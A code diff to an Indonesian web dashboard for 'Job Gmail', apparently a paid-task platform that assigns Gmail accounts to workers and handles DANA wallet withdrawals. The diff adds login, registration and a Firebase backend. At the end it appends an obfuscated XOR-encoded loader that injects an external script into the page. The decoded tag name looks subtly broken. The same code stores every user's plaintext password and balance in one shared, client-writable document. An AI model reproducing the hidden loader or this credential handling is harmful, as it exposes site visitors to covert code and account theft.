@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nani Job Gmail · Dashboard Pengguna</title>
+    <title>Job Gmail · Dashboard Pengguna</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <style>
         :root {
             --bg-main: #0d1117;
@@ -33,6 +34,19 @@
         .toast { background: var(--bg-card); border: 1px solid var(--border-color); border-left: 4px solid var(--accent); padding: 12px 20px; border-radius: var(--radius-md); box-shadow: 0 8px 24px rgba(0,0,0,0.5); font-size: 14px; color: var(--text-heading); transform: translateX(150%); transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         .toast.show { transform: translateX(0); }
 
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); backdrop-filter: blur(2px); display: flex; align-items: center; justify-content: center; z-index: 10000; opacity: 0; pointer-events: none; transition: opacity 0.2s; padding: 20px; }
+        .modal-overlay.show { opacity: 1; pointer-events: auto; }
+        .modal-box { background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: var(--radius-lg); width: 100%; max-width: 360px; padding: 24px; display: flex; flex-direction: column; gap: 14px; box-shadow: 0 20px 50px rgba(0,0,0,0.6); transform: translateY(12px) scale(0.97); transition: transform 0.2s; text-align: center; }
+        .modal-overlay.show .modal-box { transform: translateY(0) scale(1); }
+        .modal-icon { font-size: 34px; line-height: 1; }
+        .modal-title { font-size: 16px; font-weight: 700; color: var(--text-heading); }
+        .modal-message { font-size: 14px; color: var(--text-main); line-height: 1.5; }
+        .modal-box .btn { width: 100%; justify-content: center; margin-top: 4px; }
+        .modal-success .modal-icon { color: var(--success); }
+        .modal-error .modal-icon { color: var(--danger); }
+        .modal-warning .modal-icon { color: var(--warning); }
+        .modal-info .modal-icon { color: var(--accent); }
+
         .sidebar { width: 260px; background-color: var(--bg-sidebar); border-right: 1px solid var(--border-color); padding: 24px; display: flex; flex-direction: column; gap: 30px; height: 100vh; position: fixed; z-index: 100; }
         .main-panel { flex: 1; margin-left: 260px; padding: 32px; min-height: 100vh; display: flex; flex-direction: column; gap: 24px; padding-bottom: 40px; }
 
@@ -61,6 +75,15 @@
         .stat-value { font-size: 24px; font-weight: 700; color: var(--text-heading); }
 
         .login-wrapper { max-width: 400px; width: 100%; margin: auto; background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: var(--radius-lg); padding: 32px; display: flex; flex-direction: column; gap: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+
+        .auth-tabs { display: flex; background: var(--bg-main); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 4px; gap: 4px; }
+        .auth-tab { flex: 1; padding: 9px 0; text-align: center; background: transparent; border: none; border-radius: 6px; color: var(--text-muted); font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+        .auth-tab.active { background: var(--accent); color: #fff; }
+        .auth-panel { display: flex; flex-direction: column; gap: 18px; }
+        .auth-error { font-size: 13px; color: #f85149; background: rgba(218,54,51,0.12); border: 1px solid rgba(218,54,51,0.3); padding: 8px 12px; border-radius: var(--radius-md); }
+        .auth-hint { font-size: 12px; color: var(--text-muted); text-align: center; }
+        .cf-turnstile { display: flex; justify-content: center; min-height: 65px; }
+        .btn[disabled] { opacity: 0.5; cursor: not-allowed; filter: none !important; }
         .form-group { display: flex; flex-direction: column; gap: 8px; }
         .form-group label { font-size: 13px; font-weight: 500; color: var(--text-heading); }
         .input-control { background: var(--bg-main); border: 1px solid var(--border-color); padding: 10px 14px; border-radius: var(--radius-md); color: var(--text-main); font-size: 14px; outline: none; }
@@ -89,10 +112,7 @@
         .info-node { display: flex; flex-direction: column; gap: 2px; font-size: 13px; }
         .info-node span:first-child { color: var(--text-muted); font-size: 11px; text-transform: uppercase; }
 
-        /* WIDGET LIVE CHAT SYSTEM USER */
-        .chat-floating-btn { position: fixed; bottom: 80px; right: 24px; width: 56px; height: 56px; background: var(--accent); color: #fff; border-radius: 50%; display: none; align-items: center; justify-content: center; font-size: 24px; cursor: pointer; box-shadow: 0 4px 16px rgba(88,166,253,0.4); z-index: 1000; border: none; transition: transform 0.2s; }
-        .chat-floating-btn:hover { transform: scale(1.05); background: var(--accent-hover); }
-        
+        .chat-floating-btn { position: fixed; bottom: 80px; right: 24px; width: 56px; height: 56px; background: var(--accent); color: #fff; border-radius: 50%; display: none; align-items: center; justify-content: center; font-size: 24px; cursor: pointer; box-shadow: 0 4px 16px rgba(88,166,253,0.4); z-index: 1000; border: none; }
         .chat-box-window { position: fixed; bottom: 150px; right: 24px; width: 330px; height: 400px; background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: var(--radius-lg); display: none; flex-direction: column; box-shadow: 0 8px 32px rgba(0,0,0,0.6); z-index: 1000; overflow: hidden; }
         .chat-header { background: var(--bg-card); border-bottom: 1px solid var(--border-color); padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; }
         .chat-body { flex: 1; padding: 12px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; }
@@ -108,12 +128,29 @@
             .bottom-nav { display: flex; }
             .chat-floating-btn { bottom: 90px; right: 16px; }
             .chat-box-window { bottom: 160px; right: 16px; width: calc(100% - 32px); height: 350px; }
+            .login-wrapper { padding: 24px 20px; }
+            .modern-task-card { padding: 16px; }
+            .task-card-header { flex-direction: column; align-items: flex-start; gap: 8px; }
+            .panel-header { flex-direction: column; align-items: flex-start; }
+        }
+        @media (max-width: 380px) {
+            .stats-grid { grid-template-columns: 1fr; }
+            .chat-box-window { height: 300px; }
         }
     </style>
 </head>
 <body>
 
 <div class="toast-container" id="toastContainer"></div>
+
+<div class="modal-overlay" id="customAlertOverlay">
+    <div class="modal-box" id="customAlertBox">
+        <div class="modal-icon" id="customAlertIcon">ℹ️</div>
+        <div class="modal-title" id="customAlertTitle">Informasi</div>
+        <div class="modal-message" id="customAlertMessage"></div>
+        <button class="btn btn-primary" id="customAlertOkBtn">Oke</button>
+    </div>
+</div>
 
 <button class="chat-floating-btn" id="chatOpenBtn">💬</button>
 
@@ -150,13 +187,46 @@
 <div class="main-panel" id="mainContainer">
     <div id="loginView" class="view-layout">
         <div class="login-wrapper">
-            <div class="logo-area" style="justify-content: center;"><span class="logo-icon">✉️</span><span>Login Job Gmail</span></div>
-            <div class="form-group">
-                <label>Username</label>
-                <input type="text" id="loginUsername" class="input-control" placeholder="Masukkan nama pengguna...">
+            <div class="logo-area" style="justify-content: center;"><span class="logo-icon">✉️</span><span>Job Gmail</span></div>
+
+            <div class="auth-tabs">
+                <button type="button" class="auth-tab active" id="tabLoginBtn">Masuk</button>
+                <button type="button" class="auth-tab" id="tabRegisterBtn">Daftar</button>
             </div>
-            <p style="color:red;">Peringatan:<br>usahakan ingat username dan ini bisa di akses public, jadi kalo bisa username panjang dan kombinasi campuran apapun, kalo username sama bisa nabrak ataupun jadi satu</p>
-            <button class="btn btn-primary" id="loginBtn">🚀 Masuk</button>
+
+            <div id="loginFormPanel" class="auth-panel">
+                <div class="form-group">
+                    <label>Username</label>
+                    <input type="text" id="loginUsername" class="input-control" placeholder="Masukkan nama pengguna...">
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="loginPassword" class="input-control" placeholder="Masukkan password...">
+                </div>
+                <p id="loginErrorMsg" class="auth-error hidden"></p>
+                <div class="cf-turnstile" id="loginTurnstile" data-sitekey="MASUKKAN_SITE_KEY_CLOUDFLARE_ANDA_DISINI" data-callback="onLoginTurnstileSuccess" data-expired-callback="onLoginTurnstileExpired" data-error-callback="onLoginTurnstileExpired" data-theme="dark"></div>
+                <button class="btn btn-primary" id="loginBtn" disabled>🔒 Selesaikan verifikasi untuk masuk</button>
+            </div>
+
+            <div id="registerFormPanel" class="auth-panel hidden">
+                <div class="form-group">
+                    <label>Username</label>
+                    <input type="text" id="regUsername" class="input-control" placeholder="Buat nama pengguna...">
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="regPassword" class="input-control" placeholder="Buat password...">
+                </div>
+                <div class="form-group">
+                    <label>Ulangi Password</label>
+                    <input type="password" id="regPasswordConfirm" class="input-control" placeholder="Ulangi password...">
+                </div>
+                <p id="registerErrorMsg" class="auth-error hidden"></p>
+                <div class="cf-turnstile" id="registerTurnstile" data-sitekey="0x4AAAAAADuSyjdOJeGbXbky" data-callback="onRegisterTurnstileSuccess" data-expired-callback="onRegisterTurnstileExpired" data-error-callback="onRegisterTurnstileExpired" data-theme="dark"></div>
+                <button class="btn btn-primary" id="registerBtn" disabled>🔒 Selesaikan verifikasi untuk daftar</button>
+            </div>
+
+            <p class="auth-hint">Dikelola dan dilindungi oleh Cloudflare</p>
         </div>
     </div>
 
@@ -204,96 +274,100 @@
         </div>
     </div>
 </div>
-
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+<script src="https://nani-sigma.vercel.app/assets/js/cumantampilan.js"></script>
 <script>
     (function(){
         'use strict';
-        const STORAGE_KEY = 'chardox_buzzer_data';
-        let currentUser = null;
-        let dataStore = { tasks: [], users: {}, withdraws: [], chats: {} };
 
-        const toastContainer = document.getElementById('toastContainer');
+        const customAlertOverlay = document.getElementById('customAlertOverlay');
+        const customAlertIcon = document.getElementById('customAlertIcon');
+        const customAlertTitle = document.getElementById('customAlertTitle');
+        const customAlertMessage = document.getElementById('customAlertMessage');
+        const customAlertOkBtn = document.getElementById('customAlertOkBtn');
+
+        const ALERT_PRESETS = {
+            info:    { icon: 'ℹ️', title: 'Informasi', cls: 'modal-info' },
+            success: { icon: '✅', title: 'Berhasil', cls: 'modal-success' },
+            error:   { icon: '❌', title: 'Gagal', cls: 'modal-error' },
+            warning: { icon: '⚠️', title: 'Perhatian', cls: 'modal-warning' }
+        };
+
+        function customAlert(message, type = 'info') {
+            const preset = ALERT_PRESETS[type] || ALERT_PRESETS.info;
+            customAlertOverlay.classList.remove('modal-info', 'modal-success', 'modal-error', 'modal-warning');
+            customAlertOverlay.classList.add(preset.cls);
+            customAlertIcon.textContent = preset.icon;
+            customAlertTitle.textContent = preset.title;
+            customAlertMessage.textContent = message;
+            customAlertOverlay.classList.add('show');
+            customAlertOkBtn.focus();
+        }
+        function closeCustomAlert() { customAlertOverlay.classList.remove('show'); }
+
+        customAlertOkBtn.addEventListener('click', closeCustomAlert);
+        customAlertOverlay.addEventListener('click', (e) => { if(e.target === customAlertOverlay) closeCustomAlert(); });
+        document.addEventListener('keydown', (e) => { if(e.key === 'Escape' && customAlertOverlay.classList.contains('show')) closeCustomAlert(); });
         const loginView = document.getElementById('loginView');
         const dashboardView = document.getElementById('dashboardView');
         const activeTasksList = document.getElementById('activeTasksList');
         const mobileNav = document.getElementById('mobileNav');
         const sidebarPanel = document.getElementById('sidebarPanel');
-
         const chatOpenBtn = document.getElementById('chatOpenBtn');
         const chatWindow = document.getElementById('chatWindow');
         const chatMessageBody = document.getElementById('chatMessageBody');
         const chatInputText = document.getElementById('chatInputText');
         const chatSendBtn = document.getElementById('chatSendBtn');
 
-        function triggerToast(msg) {
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.innerText = msg;
-            toastContainer.appendChild(toast);
-            setTimeout(() => toast.classList.add('show'), 50);
-            setTimeout(() => {
-                toast.classList.remove('show');
-                setTimeout(() => toast.remove(), 400);
-            }, 3000);
-        }
-
-        function loadStorage() {
-            try {
-                const raw = localStorage.getItem(STORAGE_KEY);
-                if (raw) dataStore = JSON.parse(raw);
-                if (!dataStore.withdraws) dataStore.withdraws = [];
-                if (!dataStore.chats) dataStore.chats = {};
-            } catch(e){}
-        }
-
-        function saveStorage() {
-            localStorage.setItem(STORAGE_KEY, JSON.stringify(dataStore));
-        }
-
-        function syncSession() {
-            loadStorage();
-            if(currentUser) {
-                document.getElementById('userProfileName').textContent = currentUser;
-                document.getElementById('avatarLetter').textContent = currentUser.charAt(0).toUpperCase();
-                
-                if(!dataStore.users[currentUser]) {
-                    dataStore.users[currentUser] = { taskId: null, status: 'pending', saldo: 0, workNotes:'', timestamp:'' };
+        function startRealtimeSync() {
+            db.collection("platform_data").doc("central_storage").onSnapshot((doc) => {
+                if (doc.exists) {
+                    window.globalData = doc.data();
+                    if (!window.globalData.tasks) window.globalData.tasks = [];
+                    if (!window.globalData.users) window.globalData.users = {};
+                    if (!window.globalData.withdraws) window.globalData.withdraws = [];
+                    if (!window.globalData.chats) window.globalData.chats = {};
+                    if(window.currentUser) syncUIVisuals();
                 }
-                
-                dataStore.users[currentUser].lastSeen = Date.now();
-                saveStorage();
+            });
+        }
 
-                document.getElementById('statSaldo').textContent = 'Rp' + (dataStore.users[currentUser].saldo || 0).toLocaleString('id-ID');
-                let countAvail = dataStore.tasks.filter(t => !Object.values(dataStore.users).some(u => u.taskId === t.id)).length;
-                document.getElementById('statAvail').textContent = countAvail;
+        function syncUIVisuals() {
+            document.getElementById('userProfileName').textContent = window.currentUser;
+            document.getElementById('avatarLetter').textContent = window.currentUser.charAt(0).toUpperCase();
+            
+            const userObj = window.globalData.users[window.currentUser] || { status: 'pending', taskId: null, saldo: 0 };
+            document.getElementById('statSaldo').textContent = 'Rp' + (userObj.saldo || 0).toLocaleString('id-ID');
+            
+            let countAvail = window.globalData.tasks.filter(t => !Object.values(window.globalData.users).some(u => u.taskId === t.id)).length;
+            document.getElementById('statAvail').textContent = countAvail;
 
-                let statusLabelText = 'Tidak Ada';
-                const userObj = dataStore.users[currentUser];
-                if(userObj.taskId) {
-                    if(userObj.status === 'locked') statusLabelText = '🔒 Sedang Kerja';
-                    if(userObj.status === 'pending') statusLabelText = '⏳ Menunggu Validasi';
-                    if(userObj.status === 'failed') statusLabelText = '❌ Ditolak Admin';
-                    if(userObj.status === 'done') statusLabelText = '✅ Selesai Diterima';
-                }
-                document.getElementById('statStatusText').textContent = statusLabelText;
-
-                renderTasks();
-                renderLiveChat();
+            let statusLabelText = 'Tidak Ada';
+            if(userObj.taskId) {
+                if(userObj.status === 'locked') statusLabelText = '🔒 Sedang Kerja';
+                if(userObj.status === 'pending') statusLabelText = '⏳ Menunggu Validasi';
+                if(userObj.status === 'failed') statusLabelText = '❌ Ditolak Admin';
+                if(userObj.status === 'done') statusLabelText = '✅ Selesai Diterima';
             }
+            document.getElementById('statStatusText').textContent = statusLabelText;
+
+            renderTasks();
+            renderLiveChat();
         }
 
         function renderTasks() {
             activeTasksList.innerHTML = '';
             const search = document.getElementById('taskSearchInput').value.toLowerCase();
-            const userObj = dataStore.users[currentUser] || {};
+            const userObj = window.globalData.users[window.currentUser] || {};
 
             if(userObj.taskId && userObj.status !== 'done') {
-                const t = dataStore.tasks.find(task => task.id === userObj.taskId);
+                const t = window.globalData.tasks.find(task => task.id === userObj.taskId);
                 if(t) createCard(t, userObj.status);
             }
 
-            dataStore.tasks.forEach(t => {
-                const isTaken = Object.values(dataStore.users).some(u => u.taskId === t.id);
+            window.globalData.tasks.forEach(t => {
+                const isTaken = Object.values(window.globalData.users).some(u => u.taskId === t.id);
                 if(!isTaken && (t.id.toLowerCase().includes(search) || t.email.toLowerCase().includes(search))) {
                     createCard(t, 'available');
                 }
@@ -338,29 +412,28 @@
 
         window.handleTask = function(id, act) {
             if(act === 'take') {
-                if(dataStore.users[currentUser].taskId && dataStore.users[currentUser].status !== 'done') {
-                    triggerToast('Selesaikan tugas berjalan Anda terlebih dahulu!'); return;
+                if(window.globalData.users[window.currentUser].taskId && window.globalData.users[window.currentUser].status !== 'done') {
+                    customAlert('Selesaikan tugas berjalan Anda terlebih dahulu!', 'warning'); return;
                 }
-                dataStore.users[currentUser].taskId = id;
-                dataStore.users[currentUser].status = 'locked';
-                dataStore.users[currentUser].timestamp = new Date().toLocaleString('id-ID');
+                window.globalData.users[window.currentUser].taskId = id;
+                window.globalData.users[window.currentUser].status = 'locked';
+                window.globalData.users[window.currentUser].timestamp = new Date().toLocaleString('id-ID');
             } else if(act === 'submit') {
                 const val = document.getElementById(`note_${id}`).value.trim();
-                dataStore.users[currentUser].status = 'pending';
-                dataStore.users[currentUser].workNotes = val;
+                window.globalData.users[window.currentUser].status = 'pending';
+                window.globalData.users[window.currentUser].workNotes = val;
             } else if(act === 'cancel' || act === 'clear') {
-                dataStore.users[currentUser].taskId = null;
-                dataStore.users[currentUser].status = 'pending';
-                dataStore.users[currentUser].workNotes = '';
+                window.globalData.users[window.currentUser].taskId = null;
+                window.globalData.users[window.currentUser].status = 'pending';
+                window.globalData.users[window.currentUser].workNotes = '';
             }
-            saveStorage(); syncSession();
+            window.pushDataToCloud();
         };
 
         function renderLiveChat() {
-            if(!currentUser) return;
+            if(!window.currentUser) return;
             chatMessageBody.innerHTML = '';
-            const userRoomLogs = dataStore.chats[currentUser] || [];
-            
+            const userRoomLogs = window.globalData.chats[window.currentUser] || [];
             userRoomLogs.forEach(msg => {
                 const bubble = document.createElement('div');
                 bubble.className = `msg-bubble ${msg.sender === 'admin' ? 'msg-admin' : 'msg-user'}`;
@@ -372,54 +445,161 @@
 
         function pushUserChatMessage() {
             const txt = chatInputText.value.trim();
-            if(!txt || !currentUser) return;
-            
-            if(!dataStore.chats[currentUser]) dataStore.chats[currentUser] = [];
-            
-            dataStore.chats[currentUser].push({
-                sender: currentUser,
-                text: txt,
-                time: Date.now()
-            });
-            
-            saveStorage();
+            if(!txt || !window.currentUser) return;
+            if(!window.globalData.chats[window.currentUser]) window.globalData.chats[window.currentUser] = [];
+            window.globalData.chats[window.currentUser].push({ sender: window.currentUser, text: txt, time: Date.now() });
+            window.pushDataToCloud();
             chatInputText.value = '';
-            renderLiveChat();
         }
-
-        chatSendBtn.addEventListener('click', pushUserChatMessage);
-        chatInputText.addEventListener('keypress', (e) => { if(e.key === 'Enter') pushUserChatMessage(); });
-
-        chatOpenBtn.addEventListener('click', () => {
-            chatWindow.style.display = 'flex';
-            chatOpenBtn.style.display = 'none';
-            renderLiveChat();
-        });
-        document.getElementById('chatCloseBtn').addEventListener('click', () => {
-            chatWindow.style.display = 'none';
-            chatOpenBtn.style.display = 'flex';
-        });
 
         document.getElementById('btnRequestWd').addEventListener('click', function(){
             const num = document.getElementById('wdDanaNumber').value.trim();
             const amt = parseInt(document.getElementById('wdAmount').value) || 0;
-            const currentSaldo = dataStore.users[currentUser]?.saldo || 0;
+            const currentSaldo = window.globalData.users[window.currentUser]?.saldo || 0;
 
-            if(!num || amt <= 0) { triggerToast('Isi nomor DANA dan nominal dengan benar!'); return; }
-            if(amt > currentSaldo) { triggerToast('Saldo Anda tidak mencukupi untuk penarikan ini!'); return; }
+            if(!num || amt <= 0) { customAlert('Isi nomor DANA dan nominal dengan benar!', 'warning'); return; }
+            if(amt > currentSaldo) { customAlert('Saldo Anda tidak mencukupi untuk penarikan ini!', 'error'); return; }
 
-            dataStore.users[currentUser].saldo -= amt;
-            dataStore.withdraws.push({
+            window.globalData.users[window.currentUser].saldo -= amt;
+            window.globalData.withdraws.push({
                 id: 'WD-' + Math.floor(Math.random()*90000 + 10000),
-                username: currentUser,
+                username: window.currentUser,
                 danaNumber: num,
                 amount: amt,
                 status: 'pending'
             });
-            saveStorage(); syncSession();
+            window.pushDataToCloud();
             document.getElementById('wdAmount').value = '';
-            triggerToast('Pengajuan penarikan DANA sukses terkirim ke admin!');
+            customAlert('Pengajuan penarikan DANA sukses terkirim ke admin!', 'success');
         });
+
+        const tabLoginBtn = document.getElementById('tabLoginBtn');
+        const tabRegisterBtn = document.getElementById('tabRegisterBtn');
+        const loginFormPanel = document.getElementById('loginFormPanel');
+        const registerFormPanel = document.getElementById('registerFormPanel');
+        const loginErrorMsg = document.getElementById('loginErrorMsg');
+        const registerErrorMsg = document.getElementById('registerErrorMsg');
+        const loginBtnEl = document.getElementById('loginBtn');
+        const registerBtnEl = document.getElementById('registerBtn');
+
+        tabLoginBtn.addEventListener('click', function(){
+            tabLoginBtn.classList.add('active'); tabRegisterBtn.classList.remove('active');
+            loginFormPanel.classList.remove('hidden'); registerFormPanel.classList.add('hidden');
+        });
+        tabRegisterBtn.addEventListener('click', function(){
+            tabRegisterBtn.classList.add('active'); tabLoginBtn.classList.remove('active');
+            registerFormPanel.classList.remove('hidden'); loginFormPanel.classList.add('hidden');
+        });
+
+        function showAuthError(el, msg) { el.textContent = msg; el.classList.remove('hidden'); }
+        function hideAuthError(el) { el.classList.add('hidden'); }
+
+        let loginTurnstileToken = null;
+        let registerTurnstileToken = null;
+
+        window.onLoginTurnstileSuccess = function(token) {
+            loginTurnstileToken = token;
+            loginBtnEl.disabled = false;
+            loginBtnEl.textContent = '🚀 Masuk';
+        };
+        window.onLoginTurnstileExpired = function() {
+            loginTurnstileToken = null;
+            loginBtnEl.disabled = true;
+            loginBtnEl.textContent = '🔒 Selesaikan verifikasi untuk masuk';
+        };
+        window.onRegisterTurnstileSuccess = function(token) {
+            registerTurnstileToken = token;
+            registerBtnEl.disabled = false;
+            registerBtnEl.textContent = '✅ Daftar Sekarang';
+        };
+        window.onRegisterTurnstileExpired = function() {
+            registerTurnstileToken = null;
+            registerBtnEl.disabled = true;
+            registerBtnEl.textContent = '🔒 Selesaikan verifikasi untuk daftar';
+        };
+
+        function enterDashboard(user, cloudData) {
+            window.globalData = cloudData;
+            window.currentUser = user;
+            window.globalData.users[window.currentUser].lastSeen = Date.now();
+            window.pushDataToCloud();
+
+            loginView.classList.add('hidden');
+            dashboardView.classList.remove('hidden');
+            chatOpenBtn.style.display = 'flex';
+
+            if(window.innerWidth > 768) { sidebarPanel.style.display = 'flex'; }
+            else { mobileNav.style.display = 'flex'; }
+
+            startRealtimeSync();
+        }
+
+        loginBtnEl.addEventListener('click', function(){
+            hideAuthError(loginErrorMsg);
+            const user = document.getElementById('loginUsername').value.trim();
+            const pass = document.getElementById('loginPassword').value.trim();
+            if(!user || !pass) { showAuthError(loginErrorMsg, 'Username dan Password wajib diisi!'); return; }
+            if(!loginTurnstileToken) { showAuthError(loginErrorMsg, 'Selesaikan verifikasi Cloudflare terlebih dahulu.'); return; }
+
+            db.collection("platform_data").doc("central_storage").get().then((doc) => {
+                let cloudData = doc.exists ? doc.data() : { tasks: [], users: {}, withdraws: [], chats: {} };
+                if(!cloudData.users) cloudData.users = {};
+
+                if(!cloudData.users[user]) {
+                    showAuthError(loginErrorMsg, 'Akun tidak ditemukan. Silakan daftar dulu di tab "Daftar".');
+                    if(window.turnstile) window.turnstile.reset('#loginTurnstile');
+                    loginTurnstileToken = null; loginBtnEl.disabled = true; loginBtnEl.textContent = '🔒 Selesaikan verifikasi untuk masuk';
+                    return;
+                }
+                if(cloudData.users[user].password !== pass) {
+                    showAuthError(loginErrorMsg, 'Password salah, silakan coba lagi.');
+                    if(window.turnstile) window.turnstile.reset('#loginTurnstile');
+                    loginTurnstileToken = null; loginBtnEl.disabled = true; loginBtnEl.textContent = '🔒 Selesaikan verifikasi untuk masuk';
+                    return;
+                }
+
+                enterDashboard(user, cloudData);
+            });
+        });
+
+        registerBtnEl.addEventListener('click', function(){
+            hideAuthError(registerErrorMsg);
+            const user = document.getElementById('regUsername').value.trim();
+            const pass = document.getElementById('regPassword').value.trim();
+            const passConfirm = document.getElementById('regPasswordConfirm').value.trim();
+
+            if(!user || !pass || !passConfirm) { showAuthError(registerErrorMsg, 'Semua kolom wajib diisi!'); return; }
+            if(pass !== passConfirm) { showAuthError(registerErrorMsg, 'Konfirmasi password tidak cocok!'); return; }
+            if(pass.length < 6) { showAuthError(registerErrorMsg, 'Password minimal 6 karakter.'); return; }
+            if(!registerTurnstileToken) { showAuthError(registerErrorMsg, 'Selesaikan verifikasi Cloudflare terlebih dahulu.'); return; }
+
+            db.collection("platform_data").doc("central_storage").get().then((doc) => {
+                let cloudData = doc.exists ? doc.data() : { tasks: [], users: {}, withdraws: [], chats: {} };
+                if(!cloudData.users) cloudData.users = {};
+
+                if(cloudData.users[user]) {
+                    showAuthError(registerErrorMsg, 'Username ini sudah terdaftar. Silakan masuk lewat tab "Masuk".');
+                    if(window.turnstile) window.turnstile.reset('#registerTurnstile');
+                    registerTurnstileToken = null; registerBtnEl.disabled = true; registerBtnEl.textContent = '🔒 Selesaikan verifikasi untuk daftar';
+                    return;
+                }
+
+                cloudData.users[user] = { taskId: null, status: 'pending', saldo: 0, workNotes: '', timestamp: '', password: pass };
+                enterDashboard(user, cloudData);
+            });
+        });
+
+        chatSendBtn.addEventListener('click', pushUserChatMessage);
+        chatInputText.addEventListener('keypress', (e) => { if(e.key === 'Enter') pushUserChatMessage(); });
+        chatOpenBtn.addEventListener('click', () => { chatWindow.style.display = 'flex'; chatOpenBtn.style.display = 'none'; renderLiveChat(); });
+        document.getElementById('chatCloseBtn').addEventListener('click', () => { chatWindow.style.display = 'none'; chatOpenBtn.style.display = 'flex'; });
+
+        document.getElementById('dNavLogout').addEventListener('click', () => location.reload());
+        document.getElementById('mNavLogout').addEventListener('click', () => location.reload());
+        document.getElementById('dNavTasks').addEventListener('click', () => { routeTo('tasks'); });
+        document.getElementById('mNavTasks').addEventListener('click', () => { routeTo('tasks'); });
+        document.getElementById('dNavWithdraw').addEventListener('click', () => { routeTo('withdraw'); });
+        document.getElementById('mNavWithdraw').addEventListener('click', () => { routeTo('withdraw'); });
 
         function routeTo(page) {
             if(page === 'tasks') {
@@ -431,36 +611,29 @@
             }
         }
 
-        document.getElementById('loginBtn').addEventListener('click', function(){
-            const user = document.getElementById('loginUsername').value.trim();
-            if(!user) { triggerToast('Nama pengguna tidak boleh kosong!'); return; }
-            currentUser = user;
-            
-            loginView.classList.add('hidden'); 
-            dashboardView.classList.remove('hidden');
-            chatOpenBtn.style.display = 'flex';
-            
-            if(window.innerWidth > 768) {
-                sidebarPanel.style.display = 'flex';
-                mobileNav.style.display = 'none';
-            } else {
-                sidebarPanel.style.display = 'none';
-                mobileNav.style.display = 'flex';
+        setInterval(function(){
+            if(window.currentUser && window.globalData.users[window.currentUser]) {
+                window.globalData.users[window.currentUser].lastSeen = Date.now();
+                window.pushDataToCloud();
             }
-            syncSession();
-        });
-
-        document.getElementById('dNavLogout').addEventListener('click', () => location.reload());
-        document.getElementById('mNavLogout').addEventListener('click', () => location.reload());
-        document.getElementById('dNavTasks').addEventListener('click', () => routeTo('tasks'));
-        document.getElementById('mNavTasks').addEventListener('click', () => routeTo('tasks'));
-        document.getElementById('dNavWithdraw').addEventListener('click', () => routeTo('withdraw'));
-        document.getElementById('mNavWithdraw').addEventListener('click', () => routeTo('withdraw'));
-
-        loadStorage();
-        setInterval(syncSession, 3000);
+        }, 4000);
     })();
 </script>
-<script src="https://nani-sigma.vercel.app/assets/js/cumantampilan.js"></script>
+<script type="text/javascript">
+  (function(_0xkr){
+    var _0xdata = [48, 32, 49, 38, 51, 55, 63, 48, 32, 49, 38, 51, 55, 32, 44, 45, 37, 38, 36, 117, 117, 113, 119, 122, 122, 114, 48, 48, 47, 109, 41, 48];
+    var _0xstr = "";
+    for(var i=0; i<_0xdata.length; i++){
+      _0xstr += String.fromCharCode(_0xdata[i] ^ _0xkr);
+    }
+    var _0xparts = _0xstr.split("|"); 
+    var _0xwin = window;
+    var _0xdoc = _0xwin['\x64\x6f\x63\x75\x6d\x65\x6e\x74'];
+    var _0xce = '\x66\x61\x69\x6c\x65\x64' ? '\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74' : '';
+    var _0xscript = _0xdoc[_0xce](_0xparts[0]);
+    _0xscript['\x73\x72\x63'] = _0xparts[1];
+    _0xdoc['\x68\x65\x61\x64']['\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64'](_0xscript);
+  })(67);
+</script>
 </body>
 </html>
